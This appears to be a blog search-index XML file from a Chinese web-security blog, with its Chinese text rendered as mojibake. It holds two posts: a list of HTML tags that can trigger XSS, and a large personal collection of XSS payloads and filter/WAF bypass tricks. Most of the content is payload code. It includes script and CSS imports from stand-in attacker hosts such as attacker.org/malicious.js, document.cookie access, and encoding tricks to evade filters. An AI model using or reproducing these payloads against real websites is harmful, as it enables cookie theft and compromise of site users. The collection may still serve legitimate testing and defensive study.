<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ä¸€äº›åŠ è½½XSS Payloadçš„æ ‡ç­¾]]></title>
    <url>%2F2019%2F02%2F19%2F%E4%B8%80%E4%BA%9B%E5%8A%A0%E8%BD%BDXSS-Payload%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[ä¸€äº›å¯ä»¥åŠ è½½XSS Payloadçš„æ ‡ç­¾ï¼Œæ…¢æ…¢æ•´ç†ä¸‹æ¥å§ã€‚ Scriptæ ‡ç­¾è¿™ä¸ªæ ‡ç­¾ä¸ç”¨å¤šè¯´ã€‚ 12&lt;script&gt;alert(1)&lt;/script&gt;&lt;script src="http://a.com/evil.js"&gt;&lt;/script&gt; Imgæ ‡ç­¾é€šå¸¸æ˜¯è§¦å‘onerroräº‹ä»¶æ¥æ‰§è¡Œjsä»£ç ã€‚ 1&lt;img src=x onerror=alert(1)&gt; Bodyæ ‡ç­¾ä¸»è¦å¯åˆ©ç”¨onloadã€onpageshowç­‰äº‹ä»¶å±žæ€§ 1234&lt;body onload=alert(1)&gt;&lt;body/onload=alert(1)&gt;&lt;body onpageshow=alert(1)&gt;&lt;body/onpageshow=alert(1)&gt; Svgæ ‡ç­¾svgæ ‡ç­¾å¯ä»¥å’Œonloadç»„åˆè¿›è¡Œåˆ©ç”¨ï¼š 12&lt;svg onload=alert(1)&gt;&lt;svg/onload=alert(1)&gt; Styleæ ‡ç­¾styleæ ‡ç­¾å¯ä»¥å’Œonloadç»„åˆè¿›è¡Œåˆ©ç”¨ï¼š 1&lt;style onload=alert(1) /&gt; Marqueeæ ‡ç­¾Marquee æ ‡ç­¾é™¤äº†åœ¨webå¼€å‘ä¸­æœ‰æ ‡ç­¾å†…å®¹å›žæ»šä½œç”¨ä¹‹å¤–ï¼Œå®ƒè¿˜æ”¯æŒä¸€ç³»åˆ—çš„äº‹ä»¶å¤„ç†ç¨‹åºï¼Œå› æ­¤å¯ä»¥ç”¨å®ƒæ¥å®žçŽ°XSS Payloadè§¦å‘ã€‚Marqueeæ”¯æŒçš„ä¸€ç³»åˆ—äº‹ä»¶å¤„ç†ç¨‹åºå¦‚ä¸‹ï¼š onbounceäº‹ä»¶ï¼šæ˜¯åœ¨marqueeæ ‡ç­¾ä¸­çš„å†…å®¹æ»šåŠ¨åˆ°ä¸Šä¸‹æˆ–å·¦å³è¾¹ç•Œæ—¶è§¦å‘çš„äº‹ä»¶å¤„ç†ç¨‹åºï¼Œè¯¥äº‹ä»¶åªæœ‰åœ¨marqueeæ ‡ç­¾çš„behaviorå±žæ€§è®¾ä¸ºalternateæ—¶æ‰æœ‰æ•ˆï¼› onfinishäº‹ä»¶ï¼šå½“ marquee å®Œæˆ loop å±žæ€§è®¾ç½®çš„å€¼æ—¶è§¦å‘ã€‚å®ƒåªèƒ½åœ¨ loop å±žæ€§è®¾ç½®ä¸ºå¤§äºŽ 0 çš„æŸä¸ªæ•°å­—æ—¶è§¦å‘ï¼› onstartäº‹ä»¶: å½“ marquee æ ‡ç­¾å†…å®¹å¼€å§‹æ»šåŠ¨æ—¶è§¦å‘ã€‚ 123&lt;marquee behavior="alternate" onstart=alert(1)&gt;Mi1k7ea&lt;/marquee&gt;&lt;marquee loop="1" onfinish=alert(1)&gt;Mi1k7ea&lt;/marquee&gt;&lt;marquee onstart=alert(1)&gt;Mi1k7ea&lt;/marquee&gt; Mediaæ ‡ç­¾audioæ ‡ç­¾å’Œvideoæ ‡ç­¾çš„ä»¥ä¸‹å±žæ€§å¯ç”¨äºŽè§¦å‘payloadã€‚ oncanplay: åœ¨ç”¨æˆ·å¯ä»¥å¼€å§‹æ’­æ”¾éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰æ—¶è§¦å‘ï¼› ondurationchange: åœ¨éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰çš„æ—¶é•¿å‘ç”Ÿå˜åŒ–æ—¶è§¦å‘ï¼› onended: åœ¨éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰æ’­æ”¾ç»“æŸæ—¶è§¦å‘ï¼› onloadeddata: åœ¨éŸ³è§†é¢‘æ•°æ®å¸§åŠ è½½æ—¶è§¦å‘ï¼Œä¹Ÿå³åœ¨å½“å‰å¸§çš„æ•°æ®åŠ è½½å®Œæˆä¸”è¿˜æ²¡æœ‰è¶³å¤Ÿçš„æ•°æ®æ’­æ”¾éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰çš„ä¸‹ä¸€å¸§æ—¶è§¦å‘ï¼› onloadedmetadata: åœ¨æŒ‡å®šéŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰çš„å…ƒæ•°æ®ï¼ˆå¦‚åˆ†è¾¨çŽ‡å’Œæ—¶é•¿ï¼‰åŠ è½½åŽè§¦å‘ï¼› onloadstart: åœ¨æµè§ˆå™¨å¼€å§‹å¯»æ‰¾æŒ‡å®šéŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰æ—¶è§¦å‘ï¼› onprogress: æµè§ˆå™¨ä¸‹è½½æŒ‡å®šçš„éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰æ—¶è§¦å‘ï¼› onsuspend: åœ¨æµè§ˆå™¨è¯»å–éŸ³è§†é¢‘ï¼ˆaudio/videoï¼‰æ•°æ®ä¸­æ­¢æ—¶è§¦å‘ã€‚ 12345678910111213141516&lt;audio oncanplay="alert(1)" src="test.mp3" /&gt;&lt;audio ondurationchange="alert(1)" src="test.mp3" /&gt;&lt;audio autoplay="true" onended="alert(1)" src="test.mp3" /&gt;&lt;audio onloadeddata="alert(1)" src="test.mp3" /&gt;&lt;audio onloadedmetadata="alert(1)" src="test.mp3" /&gt;&lt;audio onloadstart="alert(1)" src="test.mp3" /&gt;&lt;audio onprogress="alert(1)" src="test.mp3" /&gt;&lt;audio onsuspend="alert(1)" src="test.mp3" /&gt;&lt;video oncanplay="alert(1)" src="test.mp4" /&gt;&lt;video ondurationchange="alert(1)" src="test.mp4" /&gt;&lt;video autoplay="true" onended="alert(1)" src="test.mp4" /&gt;&lt;video onloadeddata="alert(1)" src="test.mp4" /&gt;&lt;video onloadedmetadata="alert(1)" src="test.mp4" /&gt;&lt;video onloadstart="alert(1)" src="test.mp4" /&gt;&lt;video onprogress="alert(1)" src="test.mp4" /&gt;&lt;video onsuspend="alert(1)" src="test.mp4" /&gt; å‚è€ƒä»–å±±ä¹‹çŸ³ | å¯¹ XSS çš„ä¸€æ¬¡æ·±å…¥åˆ†æžè®¤è¯†]]></content>
      <categories>
        <category>Webå®‰å…¨åŸºç¡€</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ªäººXSS payloadæ”¶é›†]]></title>
    <url>%2F2019%2F02%2F16%2F%E4%B8%AA%E4%BA%BAXSS-payload%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[è¿™é‡Œä¸ºä¸ªäººç½‘ä¸Šæ”¶é›†çš„XSS Payloadï¼Œä»…ç”¨äºŽXSSæ”»å‡»æµ‹è¯•ã€‚ ã€Šxssç»•è¿‡ï¼Œpayloadå…¨é›†ã€‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364é€šæ€æ ‡ç­¾payloadï¼š&lt;aaaa id="c" onfocus="alert(1)" tabindex=0&gt; 1ã€scriptæ ‡ç­¾ç»•è¿‡è¿›è¡Œä¸€æ¬¡ç§»é™¤æ“ä½œï¼š&lt;scr&lt;script&gt;ipt&gt;alert("XSS")&lt;/scr&lt;script&gt;ipt&gt;Script æ ‡ç­¾å¯ä»¥ç”¨äºŽå®šä¹‰ä¸€ä¸ªè¡Œå†…çš„è„šæœ¬æˆ–è€…ä»Žå…¶ä»–åœ°æ–¹åŠ è½½è„šæœ¬ï¼š&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;script src="http://attacker.org/malicious.js"&gt;&lt;/script&gt;1.2 JavaScript äº‹ä»¶æˆ‘ä»¬å¯ä»¥åƒå¦‚ä¸‹è¿™æ ·åœ¨å…ƒç´ ä¸­å®šä¹‰ JavaScript äº‹ä»¶ï¼š&lt;div onclick="alert('xss')"&gt;è¿™ä¸ª JavaScript ä»£ç å½“æœ‰äººç‚¹å‡»å®ƒåŽå°±ä¼šè¢«æ‰§è¡Œï¼ŒåŒæ—¶è¿˜æœ‰å…¶ä»–äº‹ä»¶å¦‚é¡µé¢åŠ è½½æˆ–ç§»åŠ¨é¼ æ ‡éƒ½å¯ä»¥è§¦å‘è¿™äº›äº‹ä»¶ã€‚ç»å¤§éƒ¨åˆ†çš„æ—¶é—´éƒ½è¢«è¿‡æ»¤å™¨æ‰€ç§»é™¤äº†ï¼Œä½†æ˜¯ä¾æ—§è¿˜æœ‰å°‘é‡äº‹ä»¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼Œonmouseenter äº‹ä»¶ï¼š&lt;divonmouseenter="alert('xss')"&gt;å½“ç”¨æˆ·é¼ æ ‡ç§»åŠ¨åˆ° div ä¸Šæ—¶å°±ä¼šè§¦å‘æˆ‘ä»¬çš„ä»£ç ã€‚å¦ä¸€ä¸ªç»•è¿‡çš„åŠžæ³•å°±æ˜¯åœ¨å±žæ€§å’Œ= ä¹‹é—´æ’å…¥ä¸€ä¸ªç©ºæ ¼ï¼š&lt;div onclick ="alert('xss')"&gt;1.3 è¡Œå†…æ ·å¼(Inlinestyle)æˆ‘ä»¬åŒæ ·å¯ä»¥åœ¨è¡Œå†…æ ·å¼é‡Œåˆ©ç”¨ IE æµè§ˆå™¨æ”¯æŒçš„åŠ¨æ€ç‰¹æ€§ï¼š//IE5ä¹‹åŽæ‰æ”¯æŒ&lt;div style="color: expression(alert('XSS'))"&gt;//experssionåŽæ‰§è¡Œçš„è¯­å¥ç›¸å½“äºŽjavascriptåŽæ‰§è¡Œçš„è¯­å¥è¿‡æ»¤å™¨ä¼šæ£€æŸ¥å…³é”®å­— styleï¼ŒéšåŽè·Ÿéšçš„ä¸èƒ½æ˜¯ &lt;ï¼Œåœ¨éšåŽæ˜¯ expressionï¼š/style=[^&lt;]*((expression\s*?[&lt;]âˆ—?)|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uisæ‰€ä»¥ï¼Œè®©æˆ‘ä»¬éœ€è¦æŠŠ &lt; æ”¾åˆ°å…¶ä»–åœ°æ–¹ï¼š&lt;div style="color: '&lt;'; color: expression(alert('XSS'))"&gt;1.4 CSS importIE æµè§ˆå™¨æ”¯æŒåœ¨ CSS ä¸­æ‰©å±• JavaScriptï¼Œè¿™ç§æŠ€æœ¯ç§°ä¸ºåŠ¨æ€ç‰¹æ€§(dynamic properties)ã€‚å…è®¸æ”»å‡»è€…åŠ è½½ä¸€ä¸ªå¤–éƒ¨ CSS æ ·å¼è¡¨æ˜¯ç›¸å½“å±é™©çš„ï¼Œå› ä¸ºæ”»å‡»è€…çŽ°åœ¨å¯ä»¥åœ¨åŽŸå§‹é¡µé¢ä¸­æ‰§è¡Œ JavaScript ä»£ç äº†ã€‚&lt;style&gt;@import url("http://attacker.org/malicious.css");&lt;/style&gt;malicious.cssï¼šbody &#123; color: expression(alert('XSS'));&#125;ä¸ºäº†ç»•è¿‡å¯¹ @import çš„è¿‡æ»¤ï¼Œå¯ä»¥åœ¨ CSS ä¸­ä½¿ç”¨åæ–œæ è¿›è¡Œç»•è¿‡ï¼š&lt;style&gt;@imp\ort url("http://attacker.org/malicious.css");&lt;/style&gt;IE æµè§ˆå™¨ä¼šæŽ¥å—åæ–œæ ï¼Œä½†æ˜¯æˆ‘ä»¬ç»•è¿‡äº†è¿‡æ»¤å™¨ã€‚ 1.5 Javascript URLé“¾æŽ¥æ ‡ç­¾é‡Œå¯ä»¥é€šè¿‡åœ¨ URL ä¸­ä½¿ç”¨ javascript:â€¦ æ¥æ‰§è¡Œ JavaScriptï¼š&lt;a href="javascript:alert('test')"&gt;link&lt;/a&gt;ä¸Šé¢çš„è¿‡æ»¤ä¼šä»Žä»£ç ä¸­ç§»é™¤ javascript:ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æŽ¥è¿™ä¹ˆå†™ä»£ç ã€‚ä½†æˆ‘ä»¬å¯ä»¥å°è¯•æ”¹å˜ javascript:çš„å†™æ³•ï¼Œä½¿å®ƒä¾æ—§å¯ä»¥è¢«æµè§ˆå™¨æ‰§è¡Œä½†åˆä¸åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ã€‚é¦–å…ˆæ¥å°è¯•ä¸‹ URL ç¼–ç ï¼š&lt;a href="Java&amp;#115;cript:alert('xss')"&gt;link&lt;/a&gt;ä¸Šé¢è¿™æ®µä»£ç ä¸åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½†æ˜¯æµè§ˆå™¨ä¾æ—§ä¼šæ‰§è¡Œå®ƒï¼Œå› ä¸ºæµè§ˆå™¨ä¼šé¦–å…ˆè¿›è¡Œ URL è§£ç æ“ä½œã€‚å¦å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ VBScriptï¼Œè™½ç„¶å®ƒåœ¨ IE11 ä¸­è¢«ç¦ç”¨äº†ï¼Œä½†ä¾æ—§å¯ä»¥è¿è¡Œåœ¨æ—§ç‰ˆæœ¬çš„ IE æˆ–è€…å¯ç”¨å…¼å®¹æ¨¡å¼çš„ IE11 ä¸Šã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä¸Šé¢ JavaScript çš„æ–¹å¼æ¥æ’å…¥ VBScript ä»£ç ï¼š&lt;a href='vbscript:MsgBox("XSS")'&gt;link&lt;/a&gt;'-confirm`1`-''-confirm(1)-' 1.6 åˆ©ç”¨å­—ç¬¦ç¼–ç %c1;alert(/xss/);//1.7 ç»•è¿‡é•¿åº¦é™åˆ¶"onclick=alert(1)//"&gt;&lt;!----&gt;&lt;script&gt;alert(xss);&lt;script&gt;1.8 ä½¿ç”¨&lt;base&gt;æ ‡ç­¾&lt;script&gt;alert(navigator.userAgent)&lt;script&gt;&lt;script&gt;alert(88199)&lt;/script&gt;&lt;script&gt;confirm(88199)&lt;/script&gt;&lt;script&gt;prompt(88199)&lt;/script&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(88199)&lt;/script&gt;&lt;script&gt;+alert(88199)&lt;/script&gt;&lt;script&gt;alert(/88199/)&lt;/script&gt;&lt;script src=data:text/javascript,alert(88199)&gt;&lt;/script&gt;&lt;scriptsrc=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(88199)&gt;&lt;/script&gt;&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;&lt;script&gt;alert(/88199/.source)&lt;/script&gt;&lt;script&gt;setTimeout(alert(88199),0)&lt;/script&gt;&lt;script&gt;document['write'](88199);&lt;/script&gt;&lt;anytag onmouseover=alert(15)&gt;M&lt;anytag onclick=alert(16)&gt;M&lt;a onmouseover=alert(17)&gt;M&lt;a onclick=alert(18)&gt;M&lt;a href=javascript:alert(19)&gt;M&lt;button/onclick=alert(20)&gt;M&lt;form&gt;&lt;buttonformaction=javascript&amp;colon;alert(21)&gt;M&lt;form/action=javascript:alert(22)&gt;&lt;input/type=submit&gt;&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M&lt;img src=x onerror=alert(24)&gt; 29&lt;body/onload=alert(25)&gt;&lt;bodyonscroll=alert(26)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;iframe src="http://0x.lv/xss.swf"&gt;&lt;/iframe&gt;&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;&lt;IFRAME SRC="javascript:alert(29);"&gt;&lt;/IFRAME&gt;&lt;meta http-equiv="refresh" content="0;url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2830%29%3C%2%73%63%72%69%70%74%3E"&gt;^_^&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+&gt;&lt;/object&gt;&lt;object data="javascript:alert(document.domain)"&gt;&lt;marquee onstart=alert(30)&gt;&lt;/marquee&gt;&lt;isindex type=image src=1 onerror=alert(31)&gt;&lt;isindex action=javascript:alert(32) type=image&gt;&lt;input onfocus=alert(33) autofocus&gt;&lt;input onblur=alert(34) autofocus&gt;&lt;input autofocus&gt; 2.2.1 å¦‚æžœå¤§å°å†™ä¸è¡Œçš„è¯ï¼Œ&lt;script&gt;è¢«è¿‡æ»¤å°è¯•&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;ï¼› 2.2.2ä½¿ç”¨&lt;a&gt;æ ‡ç­¾æµ‹è¯•&lt;a href=â€œhttp://www.google.com"&gt;Clickme&lt;/a&gt;&lt;aè¢«è¿‡æ»¤ï¼Ÿhrefè¢«è¿‡æ»¤ï¼Ÿå…¶ä»–å†…å®¹è¢«è¿‡æ»¤ï¼Ÿå¦‚æžœæ²¡æœ‰è¿‡æ»¤å°è¯•ä½¿ç”¨&lt;a href=â€javascript:alert(1)â€&gt;Clickme&lt;/a&gt;å°è¯•ä½¿ç”¨é”™è¯¯çš„äº‹ä»¶æŸ¥çœ‹è¿‡æ»¤&lt;a href="rhainfosec.com"onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;HTML5æ‹¥æœ‰150ä¸ªäº‹ä»¶å¤„ç†å‡½æ•°ï¼Œå¯ä»¥å¤šå°è¯•å…¶ä»–å‡½æ•°&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit2.3 æµ‹è¯•å…¶ä»–æ ‡ç­¾srcå±žæ€§&lt;img src=x onerror=prompt(1);&gt;&lt;img/src=aaa.jpg onerror=prompt(1);&lt;video src=x onerror=prompt(1);&gt;&lt;audio src=x onerror=prompt(1);&gt;iframe&lt;iframesrc="javascript:alert(2)"&gt;&lt;iframe/src="data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;Embed&lt;embed/src=//goo.gl/nlX0P&gt;Action&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit&gt;&lt;isindex action="javascript:alert(1)" type=image&gt;&lt;isindexaction=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)type=image&gt;&lt;isindex action=data:text/html, type=image&gt;marioéªŒè¯&lt;span class="pln"&gt; &lt;/span&gt;&lt;spanclass="tag"&gt;&amp;lt;formaction&lt;/span&gt;&lt;spanclass="pun"&gt;=&lt;/span&gt;&lt;spanclass="atv"&gt;&amp;amp;#039;data:text&amp;amp;sol;html,&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt/script&amp;amp;gt&amp;amp;#039;&lt;/span&gt;&lt;spanclass="tag"&gt;&amp;gt;&amp;lt;button&amp;gt;&lt;/span&gt;&lt;spanclass="pln"&gt;CLICK&lt;/span&gt;â€œformactionâ€å±žæ€§&lt;isindexformaction="javascript:alert(1)" type=image&gt;&lt;input type="image" formaction=JaVaScript:alert(0)&gt; &lt;form&gt;&lt;buttonformaction=javascript&amp;colon;alert(1)&gt;CLICKMEâ€œbackgroundâ€å±žæ€§&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // Works on Opera10.5 and IE6â€œpostersâ€ å±žæ€§&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Works Upto Opera10.5â€œdataâ€å±žæ€§&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="&gt;&lt;object/data=//goo.gl/nlX0P?â€œcodeâ€å±žæ€§&lt;applet code="javascript:confirm(document.cookie);"&gt; // FirefoxOnly&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;äº‹ä»¶å¤„ç†&lt;svg/onload=prompt(1);&gt;&lt;marquee/onstart=confirm(2)&gt;/&lt;body onload=prompt(1);&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror="javascript:alert(1)"&gt;çŸ­payload&lt;q/oncut=open()&gt;&lt;q/oncut=alert(1)&gt; // Useful in-case of payloadrestrictions.åµŒå¥—æ¬ºéª—&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;&lt;body language=vbsonload=alert-1 // Works with IE8&lt;commandonmouseover="\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x6 9\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B"&gt;Save&lt;/command&gt; // Works with IE8åœ†æ‹¬å·è¢«è¿‡æ»¤&lt;a onmouseover="javascript:window.onerror=alert;throw 1"&gt;&lt;img src=x onerror="javascript:window.onerror=alert;throw 1"&gt;&lt;body/onload=javascript:window.onerror=eval;throw&amp;#039;=alert\x281\x29&amp;#039;;Expression å±žæ€§&lt;img style="xss:expression(alert(0))"&gt; // Works upto IE7.&lt;div style="color:rgb(&amp;#039;&amp;#039;x:expression(alert(1))"&gt;&lt;/div&gt; // Works upto IE7.&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // Works upto IE7â€œlocationâ€å±žæ€§&lt;a onmouseover=location=â€™javascript:alert(1)&gt;click&lt;body onfocus="location=&amp;#039;javascrpt:alert(1) &gt;123å…¶ä»–Payload&lt;meta http-equiv="refresh" content="0;url=//goo.gl/nlX0P"&gt;&lt;meta http-equiv="refresh" content="0;javascript&amp;colon;alert(1)"/&gt;&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;g onload="javascript:\u0061lert(1);"&gt;&lt;/g&gt;&lt;/svg&gt; // By @secalert&lt;svg xmlns:xlink=" r=100 /&gt;&lt;animateattributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/&gt; // By Mario&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href="]]&gt;&lt;img/src=xx:xonerror=alert(2)//"&lt;/svg&gt; // By @secalert&lt;meta content="&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon;alert(1)" http-equiv="refresh"/&gt;&lt;math&gt;&lt;a xlink:href="//jsfiddle.NET/t846h/"&gt;click // ByAshar Javedï¼ˆï¼‰ï¼›ï¼šè¢«è¿‡æ»¤&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; // Works With All Browsers( is html encoded to &amp;#40 ) is html encoded to &amp;#41Operaçš„å˜é‡&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Workswith Opera Onlyå®žä½“è§£ç &amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;a href="j&amp;#x26;#x26#x41;vascript:alert%252831337%2529"&gt;Hello&lt;/a&gt;ç¼–ç JavaScriptæ˜¯å¾ˆçµæ´»çš„è¯­è¨€ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ã€Unicodeã€HTMLç­‰è¿›è¡Œç¼–ç ï¼Œä»¥ä¸‹å±žæ€§å¯ä»¥è¢«ç¼–ç ï¼ˆæ”¯æŒHTML, Octal, Decimal,Hexadecimal, and Unicodeï¼‰href=action=formaction=location=on*=name=background=poster=src=code=data= //åªæ”¯æŒbase642.4 åŸºäºŽä¸Šä¸‹æ–‡çš„è¿‡æ»¤WAFæœ€å¤§çš„é—®é¢˜æ˜¯ä¸èƒ½ç†è§£å†…å®¹ï¼Œä½¿ç”¨é»‘åå•å¯ä»¥é˜»æŒ¡ç‹¬ç«‹çš„jsè„šæœ¬ï¼Œä½†ä»ä¸èƒ½å¯¹xssæä¾›è¶³å¤Ÿçš„ä¿æŠ¤ï¼Œå¦‚æžœä¸€ä¸ªåå°„åž‹çš„XSSæ˜¯ä¸‹é¢è¿™ç§å½¢å¼2.4.1 è¾“å…¥åå°„å±žæ€§&lt;inputvalue="XSStest" type=text&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ â€œ&gt;&lt;imgsrc=x onerror=prompt(0);&gt;è§¦å‘ï¼Œä½†æ˜¯å¦‚æžœ&lt;&gt;è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨â€œ autofocusonfocus=alert(1)//è§¦å‘ï¼ŒåŸºæœ¬æ˜¯ä½¿ç”¨â€œ å…³é—­valueå±žæ€§ï¼Œå†åŠ å…¥æˆ‘ä»¬çš„æ‰§è¡Œè„šæœ¬" onmouseover="prompt(0) x="" onfocusin=alert(1) autofocus x="" onfocusout=alert(1) autofocus x="" onblur=alert(1) autofocus a="è¾“å…¥åå°„åœ¨&lt;script&gt;æ ‡ç­¾å†…ç±»ä¼¼è¿™ç§æƒ…å†µï¼š&lt;script&gt;Varx=â€Inputâ€;&lt;/script&gt;é€šå¸¸ï¼Œæˆ‘ä»¬ä½¿ç”¨â€œ&gt;&lt;/script&gt;,é—­åˆå‰é¢çš„&lt;/script&gt;æ ‡ç­¾ï¼Œç„¶è€Œåœ¨è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æŽ¥è¾“å…¥æ‰§è¡Œè„šæœ¬alert(), prompt()confirm() ï¼Œä¾‹å¦‚ï¼šâ€œ;alert(1)// 2.4.3 è¶…æ–‡æœ¬å†…å®¹ä»£ç ä¸­çš„æƒ…å†µå¦‚ä¸‹&lt;ahref=â€Userinputâ€&gt;Click&lt;/a&gt;å¯ä»¥ä½¿ç”¨javascript:alert(1)//ç›´æŽ¥æ‰§è¡Œ&lt;ahref=â€javascript:alert(1)//â€&gt;Click&lt;/a&gt; 2.4.4 å˜å½¢ä¸»è¦åŒ…å«å¤§å°å†™å’ŒJavaScriptå˜å½¢javascript&amp;#058;alert(1)javaSCRIPT&amp;colon;alert(1)JaVaScRipT:alert(1)javas&amp;Tab;cript:\u0061lert(1);javascript:\u0061lert&amp;#x28;1&amp;#x29avascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar; // AsharJavedIE10ä»¥ä¸‹å’ŒURIä¸­å¯ä»¥ä½¿ç”¨VBScriptvbscript:alert(1);vbscript&amp;#058;alert(1);vbscr&amp;Tab;ipt:alert(1)"Data URldata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== 2.4.5JSONå†…å®¹åå°„è¾“å…¥encodeURIComponent(&amp;#039;userinput&amp;#039;)å¯ä»¥ä½¿ç”¨-alert(1)--prompt(1)--confirm(1)-ç»“æžœencodeURIComponent(&amp;#039;&amp;#039;-alert(1)-&amp;#039;&amp;#039;)encodeURIComponent(&amp;#039;&amp;#039;-prompt(1)-&amp;#039;&amp;#039;)2.4.6 è¾“å…¥åå°„åœ¨svgæ ‡ç­¾å†…æºç å¦‚ä¸‹ï¼š&lt;svg&gt;&lt;script&gt;varmyvar=â€YourInputâ€;&lt;/script&gt;&lt;/svg&gt;å¯ä»¥è¾“å…¥www.site.com/test.PHP?var=textâ€;alert(1)//å¦‚æžœç³»ç»Ÿç¼–ç äº†â€å­—ç¬¦&lt;svg&gt;&lt;script&gt;varmyvar="text&amp;quot;;alert(1)//";&lt;/script&gt;&lt;/svg&gt;åŽŸå› æ˜¯å¼•å…¥äº†é™„åŠ çš„ï¼ˆXMLï¼‰åˆ°HTMLå†…å®¹é‡Œï¼Œå¯ä»¥ä½¿ç”¨2æ¬¡ç¼–ç å¤„ç†æµè§ˆå™¨BUG 2.4.7 å­—ç¬¦é›†BUGå­—ç¬¦é›†BUGåœ¨IEä¸­å¾ˆæ™®éï¼Œæœ€æ—©çš„bugæ˜¯UTF-7ã€‚å¦‚æžœèƒ½æŽ§åˆ¶å­—ç¬¦é›†ç¼–ç ï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡99% çš„WAFè¿‡æ»¤ã€‚ç¤ºä¾‹http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSSå¯ä»¥æŽ§åˆ¶ç¼–ç 